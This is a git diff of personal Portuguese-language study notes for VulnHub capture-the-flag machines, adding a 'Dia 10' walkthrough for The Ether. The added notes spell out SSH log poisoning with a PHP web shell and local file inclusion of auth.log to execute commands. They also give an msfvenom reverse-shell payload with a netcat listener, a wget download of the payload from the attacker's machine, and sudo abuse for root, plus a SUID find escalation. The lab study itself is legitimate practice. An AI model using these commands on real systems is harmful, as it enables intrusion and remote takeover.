@@ -9,7 +9,8 @@ Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/
 Desafio 8 - https://www.vulnhub.com/entry/sunset-1,339/
 Desafio 9 - https://www.vulnhub.com/entry/dc-1-1,292/#download
 Desafio 10 - https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
-
+Desafio 11 - vulnhub.com/entry/goldeneye-1,240/
+Desafio 12 -
 --VM--
   
 Dia 1 - desafio 2(1° desafio)     7/9/2020
@@ -238,3 +239,38 @@ Dia 9 			15/9/2020
 			python -c 'import pty;pty.spawn("/bin/sh")'
 				find / -perm -u=s -file f 2>&-
 					/usr/bin/find -exec  "/bin/bash" \;
+
+
+Dia 10			16/9/2020
+
+*burp suite
+	repeater	-> index.php?file=about.php
+	/var/log/auth.log
+		#ssh root@192.168.0.x vai aparecer no log
+		#usaremos no lugar do usuario algum script php para ser executado no saida do log
+			ssh '?php system($_GET[x]); ?>'@192.168.0.x
+
+			file=/var/log/auth.log&x=ls
+			#passa o comando ls como parametro de x
+
+			encodar como html para comandos mais complexos
+			 decoder
+				ls -lh -> %6c%73%20%2d%6c%68
+					 index.php?file=/var/log/auth.log&x=%6c%73%20%2d%6c%68
+
+	*msfvenom -p cmd/unix/reverse_python lhost=192.168.0.x port=443 -f raw
+	#saida em linha -> encodar no burp
+
+	*nc -lnvp  443
+		python -c 'import pty;pty.spawn("/bin/bash")'	
+
+			*msfvenom -p cmd/unix/reverse_python lhost=192.168.0.x port=443 -f raw > shell_py
+				transferir o shell_py para o alvo
+					kali -> 	python -m SimpleHTTPServer 8080
+					alvo -> wget http://192.168.0.x:8080/shell_py
+
+	sudo /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
+		/var/log/auth.log  | shell_py
+		
+		
+		
